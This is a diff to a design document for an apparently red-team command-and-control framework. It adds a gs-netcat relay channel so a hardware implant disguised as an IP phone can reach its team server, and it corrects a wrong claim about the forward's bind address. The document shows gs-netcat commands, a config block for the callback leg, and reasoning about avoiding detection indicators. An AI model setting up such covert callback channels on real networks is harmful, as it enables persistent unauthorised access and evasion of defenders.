@@ -18,8 +18,10 @@ satisfy, all four fail together. They are four channels, not four chances.
 `gsocket` has a different precondition. Both ends dial *out* to the Global
 Socket Relay Network and find each other by a shared secret; neither end
 accepts an inbound connection from the network, and no address of ours is
-written anywhere on the target side. (The implant does open a *loopback*
-forward for its own use — see *Known limits*. Nothing off-host can reach it.)
+written anywhere on the target side. (The implant does open a forward for its
+own use — see *Known limits*. It binds every interface, measured in upstream
+source after this spec was approved, which is why the implant's provisioning
+closes that port with a firewall rule.)
 
 This work adds that as a fifth configurable leg in the connection matrix, for
 the hardware implant, so the implant still comes back when the other four
@@ -147,8 +149,9 @@ it. Chosen.**
 
 The image carries a static `gs-netcat`. On the team server,
 `gs-netcat -l -d 127.0.0.1 -p 8443` forwards GSRN connections into the beacon
-socket. On the implant, `gs-netcat -p <local_port>` opens a loopback port whose
-connections come out at the team server, and the `gsocket` leg performs the
+socket. On the implant, `gs-netcat -p <local_port>` opens a port whose
+connections come out at the team server (it binds every interface — see
+*Known limits*), and the `gsocket` leg performs the
 same HTTP exchange the `https` leg performs — against `127.0.0.1:<local_port>`.
 Zero new protocol code, the envelope untouched, TLS still end-to-end inside the
 pipe, and the server side holds no key. Its costs are a binary on our own
@@ -230,7 +233,7 @@ c2:
       binary_path: "/opt/raccoon/bin/gs-netcat"
       sha256: ""                       # verified before exec; empty skips
       secret_file: "/etc/raccoon/gsocket.secret"   # 0600, never argv
-      local_port: 16443                # bound to 127.0.0.1 only
+      local_port: 16443                # binds every interface; see Known limits
       scheme: "http"                   # the beacon socket's default; see above
       verify_ssl: false
       restart_delay_seconds: 30
@@ -399,10 +402,19 @@ To be carried into *Known limits* in `docs/AGENT.md`, which a test holds:
   restarts it on a delay rather than instantly.
 - Reachability depends on a third-party relay network, and on its continued
   free operation.
-- **The implant's carrier opens a loopback listening port.** Any local user on
-  that host can then reach the team server's beacon socket through it,
-  unauthenticated at the transport level. They cannot read or forge beacon
-  traffic — the AES-256-GCM envelope bounds this to exactly what a compromised
-  listener can do — but they can reach the endpoint and consume from it. The
-  forward binds `127.0.0.1` only, and on the hardware implant the local users
-  are ours.
+- **The implant's carrier opens a listening port on every interface.**
+  *(Corrected after approval: this entry originally claimed the forward binds
+  `127.0.0.1` only. It does not — measured in upstream source at v1.4.43:
+  `tools/4_gs-netcat.c:1499` sets `gopt.is_multi_peer = 1` for `-p`,
+  `tools/4_gs-netcat.c:1573-1585` takes the client branch into
+  `fd_net_listen()`, and `tools/utils.c:1238-1259` binds `htonl(INADDR_ANY)`
+  whenever the port is non-zero.)* Anything on the implant's segment can then
+  reach the team server's beacon socket through it, unauthenticated at the
+  transport level. It cannot read or forge beacon traffic — the AES-256-GCM
+  envelope bounds this to exactly what a compromised listener can do — but it
+  can reach the endpoint and consume from it. The second consequence is the
+  one this project cares about more, and no envelope bounds it: an unexpected
+  port answering on every interface is an indicator on a device impersonating
+  an IP phone. `gs-netcat` has no bind-address flag, so the implant's
+  provisioning applies a host firewall rule
+  (`software/setup/gsocket_forward_firewall.sh`).
